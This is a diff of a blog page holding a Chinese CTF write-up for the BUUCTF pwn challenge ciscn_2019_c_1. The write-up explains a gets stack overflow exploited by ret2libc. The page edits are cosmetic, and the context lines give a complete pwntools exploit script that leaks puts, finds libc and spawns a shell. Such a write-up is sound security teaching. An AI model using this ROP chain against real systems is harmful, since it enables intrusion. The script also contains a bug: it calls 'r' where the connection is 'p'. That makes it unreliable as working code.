@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-<head>
+<head><!-- hexo injector head_begin start -->
+<link rel="stylesheet" href="/css/bilicard.css">
+<!-- hexo injector head_begin end -->
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
@@ -151,7 +153,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#T5-ciscn-2019-c-1"><span class="nav-text">T5 ciscn_2019_c_1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03"><span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04"><span class="nav-text">0x04</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-text">T5 ciscn_2019_c_1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x04</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -177,7 +179,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -369,25 +371,25 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="T5-ciscn-2019-c-1"><a href="#T5-ciscn-2019-c-1" class="headerlink" title="T5 ciscn_2019_c_1"></a>T5 ciscn_2019_c_1</h2><blockquote>
+        <h2><span id="t5-ciscn_2019_c_1">T5 ciscn_2019_c_1</span></h2><blockquote>
 <p>2023-01-30WP<br>BUUCTF pwn 题<br>考点：栈溢出 ret2libc3</p>
 </blockquote>
 <span id="more"></span>
 
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>这不上一题刚做这类？直接模仿一手。。。。<br>file checksec —— 64-bit 开NX</p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>运行一下看看</p>
+<h3><span id="0x01">0x01</span></h3><p>这不上一题刚做这类？直接模仿一手。。。。<br>file checksec —— 64-bit 开NX</p>
+<h3><span id="0x02">0x02</span></h3><p>运行一下看看</p>
 <p><img data-src="https://pic1.zhimg.com/80/v2-8b7794a415c00fa88ea4eab73b44e060_1440w.webp"></p>
 <p>再看看IDA</p>
 <p><img data-src="https://img-blog.csdnimg.cn/2020082517155968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
 <p>研究了半天发现是让你加解密的<br>再看看string window 没用system和binsh<br>又发现加密函数里有gets函数，可构成栈溢出</p>
 <p><img data-src="https://img-blog.csdnimg.cn/20200825172042284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>分析  是相同的思想，这里不赘述了，大致流程就是</p>
+<h3><span id="0x03">0x03</span></h3><p>分析  是相同的思想，这里不赘述了，大致流程就是</p>
 <ol>
 <li>利用一个程序已经执行过的函数去泄露它在程序中的地址，然后取末尾3个字节，去找到这个程序所使用的libc的版本</li>
 <li>用同一个程序里函数的地址-libc里的函数地址即可得到偏移量</li>
 <li>得到偏移量后就可以推算出程序中其他函数的地址，知道其他函数的地址之后就可以去执行system（’&#x2F;bin&#x2F;sh‘）</li>
 </ol>
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>写exp</p>
+<h3><span id="0x04">0x04</span></h3><p>写exp</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line"></span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,28342)</span><br><span class="line">elf=ELF(&#x27;./ciscn_2019_c_1&#x27;)</span><br><span class="line"></span><br><span class="line">main=0x400b28</span><br><span class="line">pop_rdi=0x400c83</span><br><span class="line">ret=0x4006b9</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">payload=&#x27;\0&#x27;+&#x27;a&#x27;*(0x50-1+8)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\0&#x27;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">system=offset+libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">payload=&#x27;\0&#x27;+&#x27;a&#x27;*(0x50-1+8)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(binsh)</span><br><span class="line">payload+=p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p><a target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher">libcsearch</a>的github网址<br>安装</p>
 <blockquote>
@@ -613,13 +615,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">211k</span>
+    <span title="站点总字数">212k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:12</span>
+    <span title="站点阅读时长">3:13</span>
   </span>
 </div>
 <div class="busuanzi-count">
